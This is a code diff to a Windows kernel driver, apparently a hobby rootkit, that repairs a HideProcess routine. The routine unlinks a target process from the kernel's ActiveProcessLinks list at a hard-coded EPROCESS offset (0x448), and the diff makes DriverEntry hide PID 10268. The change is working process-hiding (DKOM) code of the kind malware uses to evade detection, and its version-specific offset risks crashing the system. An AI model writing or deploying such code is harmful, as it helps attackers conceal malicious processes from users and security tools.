@@ -1,4 +1,6 @@
 
+#include <ntifs.h>
+
 #include <ntddk.h>
 #include <wdf.h>
 
@@ -32,22 +34,23 @@ int HideProcess(int targetPID) {
     if (result != STATUS_SUCCESS) {
         DbgPrint("Unknow PsLookupProcessByProcessId error !!!");
     }
-    NTSTATUS status = 0;
-    LIST_ENTRY ActiveProcessLinks;
-    ActiveProcessLinks = *((LIST_ENTRY*)pidEPROCESS + 0x448);
+    PLIST_ENTRY ActiveProcessLinks;
+    ActiveProcessLinks = (PLIST_ENTRY)((unsigned char *)pidEPROCESS + 0x448);//pourquoi char*, je ne saurais peut être jamais
+    ActiveProcessLinks->Flink->Blink = ActiveProcessLinks->Blink;
+    ActiveProcessLinks->Blink->Flink = ActiveProcessLinks->Flink;
+    ActiveProcessLinks->Flink = NULL;
+    ActiveProcessLinks->Blink = NULL;
+
     //now hiding the process
-    ActiveProcessLinks.Flink->Blink = ActiveProcessLinks.Blink;
-    ActiveProcessLinks.Blink->Flink = ActiveProcessLinks.Flink;
-    ActiveProcessLinks.Blink = 0;
-    ActiveProcessLinks.Flink = 0;
     DbgPrint("Process is now hidden...");
     return 1;
 }
+
 NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject,_In_ PUNICODE_STRING RegistryPath){
     // NTSTATUS variable to record success or failure
     DbgPrintEx(0, 0, "Hey from kernel ! now testing...\n");
     DriverObject->DriverUnload = OnUnload;
-    HideProcess(0);//nothing
+    HideProcess(10268);//python
 
     return STATUS_SUCCESS;
 }
